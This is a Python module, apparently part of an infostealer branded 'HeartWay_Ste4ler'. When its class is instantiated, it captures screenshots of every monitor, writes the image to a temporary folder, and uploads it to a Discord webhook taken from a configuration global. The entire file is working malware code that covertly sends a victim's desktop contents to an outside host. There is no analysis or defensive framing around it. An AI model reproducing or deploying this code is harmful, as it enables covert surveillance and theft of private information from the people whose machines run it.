from PIL import ImageGrab
from requests_toolbelt.multipart.encoder import MultipartEncoder
import json
import requests

class Screenshot:
    def __init__(self):
        self.take_screenshot()
        self.send_screenshot()

    def take_screenshot(self):  
        image = ImageGrab.grab(
                    bbox=None,
                    all_screens=True,
                    include_layered_windows=False,
                    xdisplay=None
                )
        image.save(temp_path + "\\desktopshot.png")
        image.close()

    def send_screenshot(self):
        webhook_data = {
            "username": "HeartWay_Ste4ler",
            "avatar_url": "https://media.discordapp.net/attachments/1271668100856676352/1279105898652106865/r900x900r.png?ex=66db24b2&is=66d9d332&hm=86a3e227a5fc2d12334ec7215101d8da534cccec4b910c4efb92272cdc164774&=&format=webp&quality=lossless&width=662&height=662",
            "embeds": [
                {
                    "color": 5639644,
                    "title": "Desktop Screenshot",
                    "image": {
                        "url": "attachment://image.png"
                    }
                }
            ]
        }
        
        with open(temp_path + "\\desktopshot.png", "rb") as f:
            image_data = f.read()
            encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})

        requests.post(__CONFIG__["webhook"], headers={'Content-type': encoder.content_type}, data=encoder)